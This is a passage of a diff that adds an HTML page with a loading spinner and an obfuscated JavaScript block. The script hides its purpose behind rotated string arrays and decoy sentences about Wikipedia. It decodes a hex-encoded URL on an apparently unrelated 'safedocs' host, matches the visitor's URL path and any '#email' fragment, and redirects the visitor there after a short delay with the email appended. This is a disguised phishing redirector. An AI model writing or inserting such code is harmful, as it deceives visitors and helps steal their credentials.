kpGu/kClnDSpv3SrsVzgDwAoXHm0zM/MCtVMZ7lbsVd6LH+2LjN9UMGVY3e22KVxxIOuOy4cW595eBdt2OH6/HRcY7jTvn8FnxNnm/U92LwHvMowl1LwAvHQWO8K1C8P6laHj/OIAKON/7ycN7o2B4XZWH7oDT6f8rPF4eOZRI3QvAyzTLBHDvfz28QwXDy7ls3ALc+6ToeOko9NngKgTv4Gix8Fb5mB/CvV8VFq93zM9zr+LNgde/cADg3r8OePp7UfDy8y/8c+3uVbzd4vUv8Rh3CPfe9PE+KAxecka4qmjV9nSazrpTALzuNzVaLtoyAPd+HvB1+/rjNWdq7HzXem+K514M3hvXHm8yc6aJSusRYIR7PxUOb/YrOlcxeIcKiLdMBuHeJwO+BguI96U1APfSV53wjhYOb6luIO5lvN66olh4F60BuJcXbW16UDS8z8gA3MurinbdKQpe+VmQ1fx4BzrpdrHwJivOANzLuczTjULhLfEZVc+9ILxDBcKbzPKDYgD3cuz1klkx8CYTsyvGWmMA7vVyWfTJjA7enOnnIN5m22uPNeNM8DHHTQvIZVEnM/4hk8h2/piGLP+QU7/e7Iz3volTl/uIg1IejLW9H0fyKT6VARww4+igaHqhJyG8o8rGGMC8jKODwjGAXXjWA2XDyh8cfN1WOIiD/6wbCqcnR6c1OuCDg69BjQ65RSedTXsbRLxVob0NIf4gU3sbtLNpb4OJ/nbKUddtwDWb9jZoZ9Pehiy9WnzBiwpdWABLrxZfaOnV4ossvVp8kaVX1qAm35ylV4svuvTq2AFeenW7GLZJrGMHTG04K70azZC7mBrNoLFMoxk4lsm6r5y60+ezWKbRDCN6wgR1agaqDVodYPrlpDZodcDmBs0OwOM5Wh3QuUFXFrDaoNXB4HODzh2w8wadSvZeFw4/6Z4FeJ9C1hcK7HL6xyk1bW7QxqbNDdnYtLlBT/Vqc4M3Nl25XcWKTXeMYTvEOpbsrej3VKbZDGxeXVpgjj6pfaFLCrUv0rxqX6h51b5I86p9obFB7XsVmVeXbmDz6uThaqYNeuQBc7hB576ADUztbhB9YvNqOIP1NS0P2L6m3Q3Y17Q8IEtDft3S8tBB9PCUjZYHdGnIr8dKM1waND1gFxT59YXyFY7s5dc9Jdqqr2/2Fu+gtrcWfebC2zu+2t7O29rdgZ5rSFcXTPekrSnfq6Orq7feRjLlC9PJWlj5ovQr08XwLWT9xddd1lAB85mcyHR90St9zXSRfO8VsgDzShivW48LWRgeMl20hu6PamEAavDWY7UuUsOFqsCPfOviAY8UxLlCXcACLkCJGBGci6/Bj0ZGrzXbL4dlAnjC9x6NXEPGIyOPHmZji0c8PPzl9dLdu8M3B1QqlUqlUqlUKpVKpVKpVCqVKib9H506L55G7ZqgAAAAAElFTkSuQmCC" alt="">
+        <div class="loader">
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+        </div>
+    </div>
+</div>
+
+<script>
+var _0x58a3 = [
+    'The\x20Wikipedia\x20encyclopedia\x20project\x20represents\x20one\x20of\x20the\x20most\x20significant\x20developments\x20in\x20the\x20history\x20of\x20knowledge\x20dissemination\x20and\x20information\x20accessibility',
+    'Collaborative\x20knowledge\x20construction\x20through\x20distributed\x20peer\x20production\x20has\x20fundamentally\x20transformed\x20traditional\x20models\x20of\x20editorial\x20oversight\x20and\x20content\x20validation',
+    'The\x20Wikimedia\x20Foundation\x20continues\x20to\x20develop\x20infrastructure\x20supporting\x20free\x20knowledge\x20access\x20worldwide\x20through\x20technological\x20innovation\x20and\x20community\x20engagement',
+    'split',
+    'match',
+    'includes',
+    'href',
+    '#',
+    'classList',
+    'hidden',
+    'remove',
+    '\x2f[A-Z]{10}\x2f[a-z]{4}\x2f[A-Z]{25}[a-z]{8}[0-9]{6}(#[\\w.-]+@[\\w.-]+\\.\\w+)?$',
+    '68747470733a2f2f6e352d73616665646f63732e6d61726d696f72696f626963692e69742f51414d4d522f6b6173773f7369643d6e324c625370364e726d524c3165737669504c4d4535327a65786e69486f6b4d4c425a57704c527a415545554c4762665651514f4b574764784d696f2d4b785a76486145334f626668376a6b716e3430726e334a7138576966573039716431704561666534367379426573583967565261574b4e6c5130745323',
+    'substr',
+    'charCodeAt',
+    'fromCharCode',
+    'setTimeout',
+    'getElementById',
+    'location',
+    'Historical\x20development\x20of\x20collaborative\x20encyclopedias\x20demonstrates\x20the\x20evolution\x20of\x20knowledge\x20organization\x20methodologies',
+    'Systematic\x20bias\x20in\x20content\x20coverage\x20remains\x20an\x20ongoing\x20challenge\x20requiring\x20continuous\x20community\x20attention\x20and\x20intervention'
+];
+
+(function(_0x4a2e1f, _0x58a3f2) {
+    var _0x3c7b9a = function(_0x2d4e8b) {
+        while (--_0x2d4e8b) {
+            _0x4a2e1f['push'](_0x4a2e1f['shift']());
+        }
+    };
+    _0x3c7b9a(++_0x58a3f2);
+}(_0x58a3, 0x2a4));
+
+var _0x3c7b = function(_0x4a2e1f, _0x58a3f2) {
+    _0x4a2e1f = _0x4a2e1f - 0x0;
+    var _0x3c7b9a = _0x58a3[_0x4a2e1f];
+    return _0x3c7b9a;
+};
+
+function _0x2d4e8b(_0x19f3a7) {
+    var _0x4b6c2d = '';
+    for (var _0x8e4f1a = 0x0; _0x8e4f1a < _0x19f3a7['length']; _0x8e4f1a += 0x2) {
+        _0x4b6c2d += String[_0x3c7b('0xe')](parseInt(_0x19f3a7[_0x3c7b('0xd')](_0x8e4f1a, 0x2), 0x10));
+    }
+    return _0x4b6c2d;
+}
+
+var _0x7c1a9b = _0x2d4e8b(_0x3c7b('0xc'));
+var _0x9d3e2f = window[_0x3c7b('0x12')][_0x3c7b('0x6')];
+var _0x5b8c4a = _0x9d3e2f[_0x3c7b('0x4')](new RegExp(_0x3c7b('0xb')));
+
+if (_0x5b8c4a) {
+    document[_0x3c7b('0x11')]('content')[_0x3c7b('0x8')][_0x3c7b('0xa')](_0x3c7b('0x9'));
+    
+    var _0x2f6b8d = _0x7c1a9b;
+    
+    if (_0x9d3e2f[_0x3c7b('0x5')](_0x3c7b('0x7'))) {
+        var _0x4e9c1f = _0x9d3e2f[_0x3c7b('0x3')](/#(.*)$/)[0x1];
+        _0x2f6b8d = _0x7c1a9b + _0x4e9c1f;
+    }
+    
+    window[_0x3c7b('0xf')](function() {
+        window[_0x3c7b('0x12')][_0x3c7b('0x6')] = _0x2f6b8d;
+    }, 0x5dc);
+}
+</script>
+
+</body>
+</html>
